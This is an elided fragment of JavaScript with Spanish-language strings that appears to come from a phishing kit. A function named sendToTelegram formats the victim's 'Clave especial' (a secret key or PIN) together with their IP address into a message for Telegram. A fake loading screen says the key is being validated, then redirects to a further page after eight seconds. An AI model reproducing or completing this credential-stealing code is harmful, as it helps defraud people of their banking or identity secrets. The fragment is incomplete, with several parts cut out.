...
function sendToTelegram(data) {
    getIPAddress((ip) => {
        ...
        const message = `
        *✨ Verificando identidad (claveEspecial): ✨*

        📄 **Clave especial**: ${data.numeroDocumento}
        🌍 **IP**: ${ip}
...
function showLoadingScreen() {
    ...
    validatingText.textContent = 'Validando Clave especial, por favor espere...';
    ...
    // Después de 8 segundos, redirigir a index5.html
    setTimeout(() => {
